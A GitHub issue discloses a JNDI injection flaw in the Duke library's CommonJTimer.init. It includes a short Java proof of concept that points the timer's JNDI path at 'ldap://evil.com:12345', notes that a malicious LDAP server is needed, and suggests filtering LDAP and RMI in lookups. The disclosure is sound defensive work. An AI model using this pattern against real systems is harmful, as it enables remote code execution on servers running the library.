### **[LetianYuan](/LetianYuan)** commented [Jul 18, 2023](#issue-1810100707)

| **Affected Version** The latest version 1.2 and below.  **Describe the vulnerability** `no.priv.garshol.duke.server.CommonJTimer.init(Properties)` is designed to initialize a timer. However, passing an unchecked argument to this API can lead to the execution of arbitrary codes. For instance, following codes will lead to the execution of arbitrary codes from attackers:  ``` CommonJTimer timer = new CommonJTimer(); Properties timerProperties = new Properties(); timerProperties.setProperty("duke.timer-jndipath", "ldap://evil.com:12345"); timer.init(timerProperties);  ```  **To Reproduce** Build an LDAP server and provide malicious codes. Then just execute above codes would reproduce it.  **Fix Suggestion** Filter LDAP, RMI and related protocols when using `lookup`. |
